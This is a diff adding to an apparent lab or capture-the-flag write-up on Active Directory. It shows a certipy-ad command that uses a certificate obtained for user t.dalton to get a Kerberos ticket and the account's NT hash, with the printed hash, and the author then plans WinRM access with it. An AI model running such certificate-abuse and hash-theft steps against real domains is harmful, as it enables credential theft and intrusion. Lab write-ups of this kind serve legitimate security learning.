@@ -577,5 +577,22 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Now i have the certificate i can get the NTLM
 
 ```python
+certipy-ad auth -pfx t.dalton.pfx -dc-ip 10.1.209.181            
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 't.dalton@northstone.local'
+[*]     Security Extension SID: 'S-1-5-21-2679383190-2392193949-2554118403-1106'
+[*] Using principal: 't.dalton@northstone.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 't.dalton.ccache'
+[*] Wrote credential cache to 't.dalton.ccache'
+[*] Trying to retrieve NT hash for 't.dalton'
+[*] Got hash for 't.dalton@northstone.local': aad3b435b51404eeaad3b435b51404ee:d02a87eeb5afb4958f19b10ab08fbe22
 ```
+
+Now with this hash i should be able to get acess to WINRM
+
+# WINRM access as `t.dalton`
+
